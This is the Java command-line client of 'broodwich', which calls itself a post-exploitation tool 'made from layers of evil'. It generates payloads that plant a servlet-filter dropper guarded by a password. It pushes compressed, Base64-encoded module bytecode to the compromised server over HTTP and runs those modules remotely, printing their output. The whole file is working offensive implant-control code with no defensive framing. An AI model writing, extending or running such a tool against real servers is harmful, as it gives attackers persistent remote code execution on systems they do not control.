package party.itistimeto.broodwich.client;

import kong.unirest.HttpResponse;
import kong.unirest.Unirest;
import kong.unirest.UnirestException;
import party.itistimeto.broodwich.droppers.BroodwichFilter;
import party.itistimeto.broodwich.payloads.AbstractPayload;
import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Parameters;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Arrays;
import java.util.Base64;
import java.util.concurrent.Callable;
import java.util.zip.GZIPOutputStream;

@Command(
        name = "broodwich",
        description = "A Java post-exploitation tool made from layers of evil"
)
public class Client implements Callable<Integer> {
    public static void main(String... args) {
        System.exit(new CommandLine(new Client()).execute(args));
    }

    @Command
    public int payload(
            @Parameters(index = "0") String payloadClassName,
            @Parameters(index = "1") String dropperClassName,
            @Parameters(index = "2") String pathPattern,
            @Parameters(index = "3") String password
    ) {
        Class payloadClass;
        Class dropperClass;
        try {
            payloadClass = Class.forName(normalizeClassName(payloadClassName, "payloads"));
            dropperClass = Class.forName(normalizeClassName(dropperClassName, "droppers"));
        } catch (ClassNotFoundException e) {
            System.out.println("Class not found: " + e.getMessage());
            return -1;
        }

        try {
            AbstractPayload payload = (AbstractPayload) payloadClass.getDeclaredConstructor(String.class, Class.class, String.class).newInstance(pathPattern, dropperClass, password);
            System.out.println(payload.toString());
        } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) {
            e.printStackTrace();
        }

        return 0;
    }

    @Command
    public int loadmodule(
            @Parameters(index = "0") String module,
            @Parameters(index = "1") String url,
            @Parameters(index = "2") String password
    ) {
        try {
            var moduleClass = Class.forName(normalizeClassName(module, "modules"));
            var moduleByteCode = AbstractPayload.getResourceBytes(AbstractPayload.classToResource(moduleClass));

            var bos = new ByteArrayOutputStream();
            var gos = new GZIPOutputStream(bos);
            gos.write(moduleByteCode);
            gos.finish(); // necessary?
            var compressedByteCode = bos.toByteArray();

            var encodedByteCode = Base64.getEncoder().encodeToString(compressedByteCode);

            doModuleRequest("load", url, password, moduleClass.getName(), encodedByteCode);

        } catch (ClassNotFoundException | IOException e) {
            System.err.println("Module " + module + " could not be found and/or read");
            return -1;
        } catch (UnirestException e) {
            e.printStackTrace();
            return -1;
        }

        return 0;
    }

    @Command
    public int runmodule(
            @Parameters(index = "0") String name,
            @Parameters(index = "1") String url,
            @Parameters(index = "2") String password,
            @Parameters(index = "3..*") String[] params
    ) {
        try {
            var response = doModuleRequest(name, url, password, params);

            // todo: force-set 200 from filter?
            if(response.getStatus() != 200) {
                System.err.println("Error: HTTP status " + response.getStatus());
                // it just gets sloppier and sloppier...
                System.err.println("==========================================");
                System.err.println(response.getBody());
                return -1;
            }

            System.out.println(response.getBody());
        } catch (UnirestException e) {
            e.printStackTrace();
            return -1;
        }

        return 0;
    }

    @Override
    public Integer call() throws Exception {
        // todo: replace this
        System.out.println("banner here");
        return 0;
    }

    private static String normalizeClassName(String originalClassName, String module) {
        if(!originalClassName.contains(".")) {
            return "party.itistimeto.broodwich." + module + "." + originalClassName;
        }

        return originalClassName;
    }

    private static HttpResponse<String> doModuleRequest(String name, String url, String password, String... params) throws UnirestException {
        if(System.getProperties().containsKey("http.proxyHost") && System.getProperties().containsKey("http.proxyPort")) {
            Unirest.config().proxy(System.getProperty("http.proxyHost"), Integer.parseInt(System.getProperty("http.proxyPort")));
        }

        var request = Unirest.post(url)
                .field(BroodwichFilter.moduleIdKey, normalizeClassName(name, "modules"))
                .field(BroodwichFilter.passwordKey, password);
        if(params != null) {
            for(var p : params) {
                request = request.field(BroodwichFilter.moduleParamsKey, p);
            }
        }

        return request.asString();
    }
}
